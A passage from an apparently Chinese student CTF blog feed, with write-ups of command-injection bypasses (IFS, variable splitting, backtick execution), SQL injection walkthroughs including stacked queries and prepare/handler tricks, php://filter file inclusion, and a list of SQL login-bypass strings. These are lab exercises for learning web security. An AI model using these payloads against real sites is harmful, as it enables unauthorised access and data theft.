1</h1><p>接下来看下这个题目，打开题目，发现让我们ping一个网址。<br><img src="https://i.loli.net/2021/01/23/s4hfWVF37ucgxH8.png" alt="58.png"><br>随便输入一个网址，发现有回显成功。那么先看一下有啥文件。<br><img src="https://i.loli.net/2021/01/23/xHlPwB4gqYIZ1UA.png" alt="59.png"><br>先看一下源码文件（index.php）。输入</p><blockquote><p>/?ip=127.0.0.1;cat index.php</p></blockquote><p>发现它提示我们过滤了空格。<br><img src="https://i.loli.net/2021/01/23/xIMm1StYweH3dfn.png" alt="60.png"><br>那么我们要绕过空格过滤，下面提供了几种Linux下绕过空格的方式。  </p><blockquote><p>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt  </p></blockquote><p>还有很多绕过方法，在上面附上的博客里都有讲解，这里不多介绍了。一一测试后发现输入cat$IFS$9flag.txt成功绕过。看到源码。<br><img src="https://i.loli.net/2021/01/23/ENrs4eYHMfpIWRb.png" alt="61.png"><br>看到它过滤了很多字符，这也解释了为什么上面几个绕过不成功。<br>同时我们也看到它过滤了flag这个字符，这也就要求我们用别的方式绕过并输入flag。下面提供几个方式。  </p><hr><h2 id="1-构造变量法："><a href="#1-构造变量法：" class="headerlink" title="1.构造变量法："></a>1.构造变量法：</h2><blockquote><p>构造如下payload<br>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php<br>即可获取flag</p></blockquote><p>可以看到我们构造了两个变量a，b，然后再在后面引用他们，他们合起来时依旧是flag这个字符，这样仍然可以执行并且不会被匹配到。但是我们注意到a，b变量的顺序有些不对，那是因为源码中的  </p><pre><code>if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;      die(&quot;fxck your flag!&quot;);</code></pre><p>这个匹配，它的意思是如果f，l，a，g这四个字母按照顺序出现，那么就被过滤掉。所以说如果我们按照正常的顺序定义变量a=fl，b=ag；这时flag这四个字母按照顺序出现了，于是就没办法通过匹配。也就得不到flag。  </p><hr><h2 id="2-bush，sh命令法。"><a href="#2-bush，sh命令法。" class="headerlink" title="2.bush，sh命令法。"></a>2.bush，sh命令法。</h2><p>bush和sh是Linux里的命令，用来执行shell的命令，这里我们先将cat flag.php进行base64编码。  </p><blockquote><p>/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d</p></blockquote><p>这个payload后一句相当于一句shell脚本，也就是一个小脚本，它将cat flag.php这句被编码过的语句进行解码执行后输出。所以最终的执行语句应该是  </p><blockquote><p>echo cat flag.php  </p></blockquote><p>但是这样一个脚本需要sh或者bush命令来启动执行，过滤了bush还有sh可以使用，我们使用管道符让这些语句连接起来。  </p><hr><h2 id="3-内联执行"><a href="#3-内联执行" class="headerlink" title="3.内联执行"></a>3.内联执行</h2><p>这个是大佬的方法，构造以下payload  </p><blockquote><p><code>/?ip=127.0.0.1;cat$IFS$9`ls` </code></p></blockquote><p>可以看到有两个反引号，这个是内联执行的符号，内联就是将反引号内命令的输出作为输入执行。可以看到反引号里面命令是ls，那么它执行完输出的就是包含的文件，其中就包含flag文件，随后内联执行将它输出的这俩个文件名再输入执行cat命令，这样就得到了文件的内容。是一个很巧妙的方法。轻松绕过了正则匹配。  </p><hr><p>关于绕过其实还是要多积累，多见识。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> test13 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习7</title>
      <link href="test12/undefined-undefined.html"/>
      <url>test12/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天练车，就先学习Linux命令使用吧。  </p><h1 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h1><p>打开题目，发现让我们ping一个网址<br><img src="https://i.loli.net/2021/01/21/FmHKRL1dN8cjblX.png" alt="52.png"><br>于是随便ping了一个网址。发现返回成功。那么接下来我们要查询包含的文件。如何做到多个语句的执行呢，这里需要用到管道符，从而达到多命令执行的效果。<br><a href="https://blog.csdn.net/liucy007/article/details/90209277?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control">Linux之管道符</a><br><img src="https://i.loli.net/2021/01/21/zliKdXRn1bqmcDp.png" alt="53.png"><br>首先我们先查询文件，使用ls命令。<br><img src="https://i.loli.net/2021/01/21/1dknwmhKyL7O6Ce.png" alt="54.png"><br>知道包含一个index.php文件，接着打开这个文件。  </p><blockquote><p>127.0.0.1;cat index.php</p></blockquote><p><img src="https://i.loli.net/2021/01/21/zIcaZ4U3Ef1TMSG.png" alt="55.png"><br>可以在网页源码中发现文件的里面的代码，或者使用tac命令也可以显示源码。<br>可以看到源码中没有任何过滤，是一个简单的命令执行。但是我们用ls并没有发现flag文件，说明它可能在别的目录下。<br>于是可以使用ls /来查看根目录。<br><img src="https://i.loli.net/2021/01/21/Cl5cjAQXuyZon8h.png" alt="56.png"><br>发现包含flag的文件，使用cat /flag查看这个文件的内容。<br><img src="https://i.loli.net/2021/01/21/JXkoVDpbTfj3tda.png" alt="57.png"><br>得到flag。  </p><hr><p>这道题主要考察命令执行和Linux的命令使用，不算很难，管道符的使用是第一次见，感觉和sql注入的“；”和联合注入有相同的地方，都是为了执行多个语句。下面附上一些常用的管道符。  </p><blockquote><p><strong>1、|（就是按位或），直接执行|后面的语句</strong></p></blockquote><blockquote><p><strong>2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</strong></p></blockquote><blockquote><p><strong>3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</strong></p></blockquote><blockquote><p><strong>4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</strong></p></blockquote><blockquote><p><strong>5、;（linux下有的，和&amp;一样的作用）</strong>  </p></blockquote><p>同时附上一篇讲解Linux命令的博客，讲的十分详细了。<br><a href="https://blog.csdn.net/xiaoguaihai/article/details/8705992?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-8705992.pc_search_result_before_js&spm=1018.2226.3001.4187">【Linux】linux常用基本命令 </a></p>]]></content>
      
      
      <categories>
          
          <category> test12 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql闯关2</title>
      <link href="test11/undefined-undefined.html"/>
      <url>test11/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这个第二关就是第一关的一个变形。  </p><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>打开界面，按照流程先来判断注入类型。  </p><blockquote><p>?id=1 and 1=1<br>?id=1 and 1=2<br>?id=1’ and ‘1’=’1<br>?id=1’ amd ‘1’=’2</p></blockquote><p>在做这道题之前没有发现为什么要判断这个注入类型，因为看到别人用的语句没有什么变化，但是这道题让我知道二者还是有区别的。详细还是看这篇文章吧。<br><a href="https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=&request_id=&biz_id=102&utm_term=%25E4%25B8%25BA%25E4%25BB%2580%25E4%25B9%2588sql%25E6%25B3%25A8%25E5%2585%25A5%25E8%25A6%2581%25E4%25BD%25BF%25E7%2594%25A8%25E5%258D%2595%25E5%25BC%2595%25E5%258F%25B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-90296495.first_rank_v2_pc_rank_v29">sql注入基础原理（超详细)</a><br>简而言之，当是数字型注入时，后台执行的sql语句在id=1后面和句子后面是没有<strong>“</strong>‘<strong>”</strong>的，这也就是说，我们不需要构建payload时在结<br>尾加上注释符号#或者–+了。其余的和字符型注入相比没什么变化。  </p><hr><p><strong>数字型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = x and 1=1</p></blockquote><p><strong>字符型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = ‘x’ and ‘1’=’1’</p></blockquote><hr><p>接下来按照流程就行了。<br>爆库名和表名 </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段名  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),(select group _concat(table _name) from information _schema.tables where table _  schema=’security’)</p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><hr><p>这道题算是进一步让我明白数字型注入和字符型注入了。<br>其实关于sql注入，其实也就是利用对输入字符的筛选漏洞来执行一些恶意的sql语句。sql语句不难学，主要还是如何找到它筛选的漏洞和如何绕过他们的筛选。</p>]]></content>
      
      
      <categories>
          
          <category> test11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习6</title>
      <link href="test10/undefined-undefined.html"/>
      <url>test10/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天还是sql注入题，巩固基础。  </p><h1 id="极客大挑战-2019-LoveSQL-1"><a href="#极客大挑战-2019-LoveSQL-1" class="headerlink" title="[极客大挑战 2019]LoveSQL 1"></a>[极客大挑战 2019]LoveSQL 1</h1><p>打开题目，发现和前面做过的一样的界面。<br><img src="https://s3.ax1x.com/2021/01/20/sWlHgS.md.png" alt="sWlHgS.md.png"><br>先想到的就是用万能密码来做一下。输入1’ or 1=1#登录后后出现另一个界面。<br><img src="https://s3.ax1x.com/2021/01/20/sW3mZj.md.png" alt="sW3mZj.md.png"><br>给了我们用户名和密码，回到原界面输入用户名和密码后发现又回到这个页面。所以说万能密码不能解决问题。<br>那么还是老老实实按步骤来吧。先看看有几个字段。<br>发现当输到<strong>1’ order by 4#**出现报错，而前面的都是显示密码和用户名错误。（</strong>注意在用户名一栏中输入以上语句后因为后面有#，相当于把密码注释掉了，所以密码输入什么无关紧要。**）<br>那么就有三个字段，接着看看哪几位会有回显。输入1’ union select 1,2,3#<br><img src="https://i.loli.net/2021/01/20/q8XwkGx3vc7fJOi.png" alt="48.png"><br>可以看到2，3位有回显，那么这道题就变成之前做过的闯关第一关的样题了。<br>输入?id=1’ union select 1,2,database()#爆库名<br><img src="https://i.loli.net/2021/01/20/LSZJ6zGc73pObuj.png" alt="49.png"><br>得到库名，接下来就是爆表名，爆字段了。  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’geek’),database()#</p></blockquote><p><img src="https://i.loli.net/2021/01/20/NOkZo6mbBsPRdEV.png" alt="50.png"><br>得到表名,我们查看l0ve1ysq1这个表里面的字段。  </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’l0ve1ysq1’ </p></blockquote><p><img src="https://i.loli.net/2021/01/20/sqy9Tb6ptg2JZr3.png" alt="51.png"><br>得到表里面的字段名字，接下来就是分别查这三个字段里面的信息。  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><p>flag在password里。  </p><hr><p>这道题其实就是闯关第一关的翻版。并不是很难。</p>]]></content>
      
      
      <categories>
          
          <category> test10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习5</title>
      <link href="test9/undefined-undefined.html"/>
      <url>test9/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天来一道捉迷藏的题目。  </p><h1 id="极客大挑战-2019-Secret-File-1"><a href="#极客大挑战-2019-Secret-File-1" class="headerlink" title="[极客大挑战 2019]Secret File 1"></a>[极客大挑战 2019]Secret File 1</h1><p>打开题目，发现如下界面。<br><img src="https://s3.ax1x.com/2021/01/19/sg4bfx.md.png" alt="sg4bfx.md.png"><br>看见这种界面，而且没有可以点的地方的题目一律f12伺候。<br>从源码中可以看到有一个php文件。<br><img src="https://s3.ax1x.com/2021/01/19/sgIlad.md.png" alt="sgIlad.md.png"><br>于是我们就打开这个Archive_room.php文件。<br><img src="https://s3.ax1x.com/2021/01/19/sgTS74.md.png" alt="sgTS74.md.png"><br>果然跳转到另一个页面，这次还有一个点击按钮，点一下试试。<br><img src="https://s3.ax1x.com/2021/01/19/sgbM4J.md.png" alt="sgbM4J.md.png"><br>就知道不会那么简单，对这种一闪而过的情况直接进行抓包，给他拦下来。<br><img src="https://s3.ax1x.com/2021/01/19/sgbW5Q.md.png" alt="sgbW5Q.md.png"><br>通过抓包可以看到中间还经过了一个php页面，于是再回到题目中输入一下。<br><img src="https://s3.ax1x.com/2021/01/19/sgqwZT.md.png" alt="sgqwZT.md.png"><br>跳转到源码页面了。<br>这个代码很容易懂，通过get方式传参一个file变量，而且有include()<br>函数，很明显是一个文件包含漏洞。可以用伪协议来做这道题。同时可以看到它过滤了一些伪协议，但是相较于之前学长出过的题过滤的还是太轻了（哈哈哈哈哈）。<br>直接使用php://filter协议读取flag.php里面的源码。构造payload。  </p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><p>这样就能得到经过base64编码过的源码，再解码一下就能得到flag。<br><img src="https://s3.ax1x.com/2021/01/19/sgjXcj.md.png" alt="sgjXcj.md.png"><br>这道题目主要还是找到藏着的php文件，后面的代码审计反而比较简单。 </p><hr><p>附上我的php伪协议笔记<br><a href="https://george186.github.io/note2/undefined-undefined.html">php伪协议总结</a></p>]]></content>
      
      
      <categories>
          
          <category> test9 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>万能密码总结</title>
      <link href="note3/undefined-undefined.html"/>
      <url>note3/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>将从网上查到的一些sql注入的万能密码记录下来，以便以后使用。  </p><h1 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h1><p>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–  </p><h1 id="asp-aspx语言"><a href="#asp-aspx语言" class="headerlink" title="asp aspx语言"></a>asp aspx语言</h1><p>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’  </p><h1 id="jsp语言"><a href="#jsp语言" class="headerlink" title="jsp语言"></a>jsp语言</h1><p>1’or’1’=’1<br>admin’ or 1=1/*  </p>]]></content>
      
      
      <categories>
          
          <category> note3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习4</title>
      <link href="test8/undefined-undefined.html"/>
      <url>test8/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天还是注入题。  </p><h1 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h1><p>打开页面，发现这次和之前的注入有点不一样。<br><img src="https://s3.ax1x.com/2021/01/18/scS2bq.md.png" alt="scS2bq.md.png"><br>这次让输入两个值，分别是用户名和密码，而之前输入的都只有一个。但是还是按照之前的顺序来，先判断有没有注入。<br>输入username=1’,password=1’发现回显出错。<br><img src="https://s3.ax1x.com/2021/01/18/scpQLn.md.png" alt="scpQLn.md.png"><br>由出错可以判断出是字符型注入。<br>接着是查询字段，但是输入1’ order by 1# 等却无法查询，仍然是报错。<br>那就跳过这一步，接着就是查看是否有显示位。我输入的是  </p><blockquote><p>username=999’ union select 1,2,database()#</p></blockquote><p>结果直接出flag了，十分懵b。<br><img src="https://s3.ax1x.com/2021/01/18/sc9qN6.md.png" alt="sc9qN6.md.png"><br>接着我又查了一下别人的做法，发现别人用到了万能密码来做，下面讲解一下万能密码。  </p><hr><h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>用户进行用户名和密码验证时，网站需要查询数据库。查询数据库就是执行SQL语句。<br>用户登录时，后台执行的数据库查询操作（SQL语句）是：<br>【Select user _ id,user _ type,email From users Where user _ id=’用户名’ And password=’密码’】。<br>由于网站后台在进行数据库查询的时候没有对单引号进行过滤，当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为：<br>【Select user _ id,user _ type,email From users Where user _ id=’admin’ And password=’2’or’1’】。<br>由于SQL语句中逻辑运算符具有优先级，【=】优先于【and】，【and】优先于【or】，且适用传递性。因此，此SQL语句在后台解析时，分成两句：<br>【Select user _ id,user _ type,email From users Where user _ id=’admin’ And password=’2’】和【’1’】，两句bool值进行逻辑or运算，恒为TRUE。<br>SQL语句的查询结果为TRUE，就意味着认证成功，也可以登录到系统中。<br>输入用户名【admin】，密码【2’or’1】，即可登录成功。  </p><hr><p>简而言之这个就是利用or的判定方式（左右两边只要一边为真，那么总体为真）来通过SQL语句的查询认证。同理，万能密码还会有很多，比如username=1’ or 1=1#,这样实际上执行的SQL语句就成为了<br>【Select user _ id,user _ type,email From users Where username=’1’】和【1=1】。（#为SQL的注释符，所以#后面的字符不再进行判定）<br>因为后面为真，所以SQL语句查询where的判定为真。也就通过了查询认证，所以得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入闯关1</title>
      <link href="test7/undefined-undefined.html"/>
      <url>test7/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>要想学sql注入，就要不断练习。而sqli-labs这个闯关游戏就是一个很好的练习条件。这个寒假要过前十关。<br>关于这个游戏的安装百度即可，就不做详细记录了。<br><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161090447216780269871621%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161090447216780269871621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-80583959.first_rank_v2_pc_rank_v29&utm_term=sql%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2">sql注入的联合查询</a></p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>打开第一关，可以看到很简洁的界面。<br><img src="https://s3.ax1x.com/2021/01/17/syuvdg.md.png" alt="syuvdg.md.png"><br>让我们在url中输入变量id。先输入?id=1后回显如下。<br><img src="https://s3.ax1x.com/2021/01/17/syKOpR.md.png" alt="syKOpR.md.png"><br>但是输入?id=1’后报错，说明存在sql注入。<br>接下来按照程序一步步来。先来判断注入类型。  </p><blockquote><p>?id=1 and 1=1<br>?id=1 and 1=2<br>?id=1’ and ‘1’=’1<br>?id=1’ amd ‘1’=’2</p></blockquote><p>发现最后一个没有回显，所有知道是字符型注入。<br>接着判断字段个数。  </p><blockquote><p>?id=1’ order by 1–+<br>?id=1’ order by 2–+<br>?id=1’ order by 3–+<br>?id=1’ order by 4–+</p></blockquote><p>发现第四个时出现错误，说明有这个表有三个字段，也就是三列。<br><img src="https://img.imgdb.cn/item/600460473ffa7d37b3b711fa.png"><br>接着查看页面的显示位。也就是拿哪几位会显示到界面上。输入以下payload  </p><blockquote><p>?id=999’ union select 1,2,3–+</p></blockquote><p>注意不能是?id=1或?id=2之类的，因为这样会输出id=1或id=2的一行行的数据，这就无法判断是那一位回显到页面上了。但如果我们输入一个不存在的id，那么第一行就会变成空行，这时候union后面的查询语句就成为了第一行，相应的2，3位就显示在页面上了。<br><img src="https://img.imgdb.cn/item/600462263ffa7d37b3b7ed5a.png"><br>可以看出2，3位回显到页面，那么接下来构造payload要在2，3为上改动。<br>接下来爆库名  </p><blockquote><p>?id=1’ union select 1,2,database()–+</p></blockquote><p>可以查看当前使用的库的名称。<br><img src="https://s3.ax1x.com/2021/01/18/sylSFe.md.png" alt="sylSFe.md.png"><br>可以知道数据库的名字为<strong>security</strong>，接下来就是爆这个数据库中的表名了。这里的语句比较长，但是很好理解，语句如下。  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>注意这个语句要用括号括起来，否则会出错。具体原因我还没有找到。。。。<br>那么我们来理解一下这个新的长语句的意思吧。  </p><hr><blockquote><p>(select group _concat(table _name) from information _schema.tables where table _  schema=’security’)</p></blockquote><p>这个句子中有一个group_ concat()函数，这个函数的作用将对应字段的所有结果都查找并组合返回到一条记录中。<br><code>在SQL中这个函数可以将某一字段符合要求的该段对应的行的数据在一行显示。</code><br>而table _name很好理解，它就是表的名字的意思。<br>接下来是information _schema.tables。我们已经知道information _schema是系统自带的库，它包含了所有库的信息。所以information _schema.tables就是所有库中的表的信息。<br>where这个相当于编程中的if语句，它是一个判断语句。<br>table _ schema是数据库名称的意思。  </p><hr><p>综上可以知道这个语句的意思：从information _schema.tables中查询表的名字当数据库的名字为’security’。<br>也就是查询’security’库中所有表的名字并返回到到一条记录中。<br>得到的结果如图。<br><img src="https://s3.ax1x.com/2021/01/18/sy1z2d.md.png" alt="sy1z2d.md.png"><br>可以得到security库中有emails，referers，uagents，users四个表。<br>那么接下来就是爆字段了。  </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆出users表中的字段。<br><img src="https://s3.ax1x.com/2021/01/18/sy3GiF.md.png" alt="sy3GiF.md.png"><br>可以知道有id，username，password三个字段。那么接下来就是查询这三列的信息了。  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/18/syGi4S.md.png" alt="syGi4S.md.png"><br>from security.users表示从security数据库users表中查询。<br>得到用户信息。其他的表按照上述操作即可。</p><hr><h1 id="知识点小结："><a href="#知识点小结：" class="headerlink" title="知识点小结："></a>知识点小结：</h1><p>1：database()是一个函数，可以查看当前使用的数据库名字。<br>2：group_ concat()函数，这个函数的作用将对应字段的所有结果都查找并组合返回到一条记录中。<br>3：information _schema.tables包含了所有库中表的信息，此外还有information _schema.columns（包含所有库中列的信息。）等。<br>4：table _name，columns _ name等均可以直译。<br>5：sql注入语句逻辑很好理解，可以当成英语语句或者编程语句来理解。大致如下：<br>select ···查询···<br>from ···从···中<br>where···当···时</p>]]></content>
      
      
      <categories>
          
          <category> test7 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习3</title>
      <link href="test6/undefined-undefined.html"/>
      <url>test6/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天练手第一道sql注入题目<br>先附上我学习sql注入的几个博客链接，他们帮了我很多忙。<br><a href="https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=&request_id=&biz_id=102&utm_term=%25E4%25B8%25BA%25E4%25BB%2580%25E4%25B9%2588sql%25E6%25B3%25A8%25E5%2585%25A5%25E8%25A6%2581%25E4%25BD%25BF%25E7%2594%25A8%25E5%258D%2595%25E5%25BC%2595%25E5%258F%25B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-90296495.first_rank_v2_pc_rank_v29">sql注入基础原理（超详细)</a>  </p><h1 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h1><p>题目说是随便注，他可一点也不随便啊，它是有备而来。打开题目发现很简洁。<br><img src="https://s3.ax1x.com/2021/01/17/ssnrz6.md.png" alt="ssnrz6.md.png"><br>因为是新手，所以一步一步来。<br>输入1’提交发现回显错误。由此可以知道存在sql注入。<br><img src="https://s3.ax1x.com/2021/01/17/ssn2ee.md.png" alt="ssn2ee.md.png"><br>先输入以下payload来判断是什么类型的注入。  </p><blockquote><p>1 and 1=1<br>1 and 1=2<br>1’ and ‘1’=’1<br>1’ and ‘1’=’2</p></blockquote><p>发现只有第四个输入时报错，所以可以知道这个是字符型注入。<br>接下来就是查询有几个字段。分别输入以下来查询字段个数。  </p><blockquote><p>1’ order by 1#<br>1’ order by 2#<br>1’ order by 3#</p></blockquote><p>发现当输入到**1’ order by 3#**时报错，说明该表只有两个字段。（也就是两列）<br><img src="https://s3.ax1x.com/2021/01/17/ssKAu8.md.png" alt="ssKAu8.md.png"><br>接下来就是爆表爆库了，我一开始打算使用联合查询来查当前数据库名。输入了以下语句。  </p><blockquote><p>1’ union select database()#</p></blockquote><p>结果却是这样。<br><img src="https://s3.ax1x.com/2021/01/17/ssKDKK.md.png" alt="ssKDKK.md.png"><br>一个正则匹配函数把selet字符给过滤了。这就说明我不能使用联合查询了。那该怎么办呢，通过查询资料发现还有一种堆叠注入方式可以实现查询。  </p><blockquote><p>堆叠注入：在SQL中，分号表示一条sql语句的结束，在结束一条sql语句后继续下一条语句，会被一起执行；这也就形成了堆叠注入。</p></blockquote><p>其次select，where字符被屏蔽，那么该如何查表名和库名呢。<br><strong>可以使用show。</strong>  </p><blockquote><p>1.show databases;数据库名字<br>2.show tables;表名<br>3.show columns from table;字段</p></blockquote><p>所以可以构建以下语句来查表名，库名。  </p><blockquote><p>1’; show databases;#</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/17/ssNBH1.md.png" alt="ssNBH1.md.png"><br>得到所有库名，其中information_schema和performance _schema，test是自带的库，经过查询发现flag是在supersqli这个库中，输入</p><blockquote><p>1’;show tables from supersqli;#</p></blockquote><p>就可以得到supersqli库中表的名字。<br><img src="https://s3.ax1x.com/2021/01/17/ssURiV.md.png" alt="ssURiV.md.png"><br>分别查询这两个表中的字段。  </p><blockquote><p>1’;show columns from words;#<br>1’;show columns from <code>1919810931114514</code>;#</p></blockquote><p>注意在查询1919810931114514库时，直接输入其库名是查不出来的，这是因为这个库名会和MySQL的关键字冲突，这时候要在库名前后加上“`”这个符号来说明它不是关键字，也就是转义。<br>查询后发现flag字符串在1919810931114514表内。<br><a href="https://imgchr.com/i/ssaawR"><img src="https://s3.ax1x.com/2021/01/17/ssaawR.md.png" alt="ssaawR.md.png"></a><br>接下来就是如何读取flag字段中的内容了。<br>因为select不能使用，在网上查询后得知还有handler语句可以查询表中数据，语法为  </p><blockquote><p>HANDLER tbl_ name OPEN打开一张表<br>HANDLER tbl_ name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p></blockquote><p>所以试着输入以下语句  </p><blockquote><p>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;–+</p></blockquote><p>这里的注释要用–+，使用#注释会显示不出来（我还不知道为什么）可能是没转码。<br>这样就可以得到flag。  </p><hr><p>但是这种方法只对于MySQL有用，应该还有别的通用方法，我查询了更多人的wp，发现的确如此。<br>因为select被过滤了，所以先将select * from 1919810931114514进行16进制编码，在构造  </p><blockquote><p>1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p></blockquote><p>进而得到flag<br>或者</p><blockquote><p>1’;set @a=concat(“sel”,”ect flag from 1919810931114514 “);prepare hi from @a;execute hi;#  </p></blockquote><p>也可得到flag</p><p>其中prepare…from…是预处理语句，会进行编码转换。<br>execute用来执行由SQLPrepare创建的SQL语句。<br>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。<br>也就是说先给@a赋值为select * from 1919810931114514的十六进制编码。，然后后再使用prepare…from…进行编码转换，从而查询表中的所有信息。  </p><hr><p>还有一种方法，就是先用rename将words表名改为其他名字，再将1919810931114514表名改为words，将flag列改为id，最后输入1’ or 1=1#来查看flag列的内容。<br>但是这个方法我还没试成功过，思路是没问题的，只是我暂时没搞懂(太菜了）。 </p>]]></content>
      
      
      <categories>
          
          <category> test6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习2</title>
      <link href="test5/undefined-undefined.html"/>
      <url>test5/undefined-undefined.html</url>
      
